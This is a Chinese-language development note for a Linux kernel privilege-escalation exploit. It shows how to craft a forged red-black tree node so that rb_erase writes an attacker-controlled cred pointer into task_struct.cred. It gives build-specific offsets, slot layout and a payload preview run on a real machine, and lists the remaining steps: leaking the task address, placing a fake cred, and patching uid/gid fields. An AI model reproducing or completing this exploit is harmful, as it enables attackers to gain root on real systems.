# 伪造节点 payload（2026-10-25）

## 目标

让 `timerqueue_del` → `rb_erase` 在回收路径上把一个**受控值写进 `task+0x908`**（`task_struct.cred`）。

## rb_erase 的写行为

删除一个叶子节点时，内核执行：

```c
parent = rb_parent(node);                       /* node->__rb_parent_color */
if (parent) {
    if (parent->rb_left == node) parent->rb_left  = child;   /* 写 parent+16 */
    else                         parent->rb_right = child;   /* 写 parent+8  */
    if (child) rb_set_parent(child, parent);
}
```

`struct rb_node` 布局：`__rb_parent_color` @0，`rb_right` @8，`rb_left` @16。

## 本构建的取值

| 项 | 值 |
| --- | --- |
| `task_struct.cred` | `+0x908`（BTF 与 BRM 表格一致） |
| `k_itimer` 大小 | `0x180` |
| `it` 联合体在 `k_itimer` 内 | `+0xe0` |
| 页内节点偏移 | `0xe0 + n*0x180`（**8 KiB 页里 21 个槽位**） |

伪造节点：

```
__rb_parent_color = target - 8 = task + 0x900   （正好是 real_cred 字段）
rb_right          = 要写进去的值（伪造 cred 地址）
rb_left           = 0                            （≠ node，保证走 else 分支）
expires           = 0                            （防止被重新插入）
```

因为 `parent->rb_left` 读的是 `real_cred` 的值（一个内核指针），必然 `!= node`，
所以走 else 分支，写落在 `parent+8 = task+0x908`。✅

## 预览输出（真机跑，只打印不写内核）

```
=== payload preview ===
  task_struct.cred target : 0xffffffe4d9d00908
  forged parent           : 0xffffffe4d9d00900  (target-8)
  value to plant (cred)   : 0xffffff8100000000
  node slots in 8 KiB page: 21  (offsets 0xe0 + n*0x180)
  node[0] @+0x0e0: parent=0xffffffe4d9d00900 right=0xffffff8100000000 left=0x0000000000000000
  node[1] @+0x260: parent=0xffffffe4d9d00900 right=0xffffff8100000000 left=0x0000000000000000
=== nothing was written to the kernel ===
```

## 还差的三件事

1. **真实 `task` 地址**：必须从回收页里读出来。机制：8 KiB stream 占住页之后，
   内核在 reap 时往页里写 node 字段，我们**从 socket 读回**自己那块缓冲就能看到内核写进去的指针。
2. **伪造 cred 放在哪**：最自然的答案是**同一张回收页内**（内容我们全控），
   地址 = 页基址 + 偏移；页基址同样来自第 1 步的读回。
3. **`rb_set_parent(child, parent)` 的副作用**：它会写 `child->__rb_parent_color`，
   也就是往伪造 cred 的头 8 字节写一个指针；BRM 的做法是随后两次写零修
   `uid/gid` 与 `suid/sgid`，我们照抄。

## 状态

`--payload-preview` 只构造并打印，不写内核。真正触发仍锁在 `--run --i-accept-reboot`。
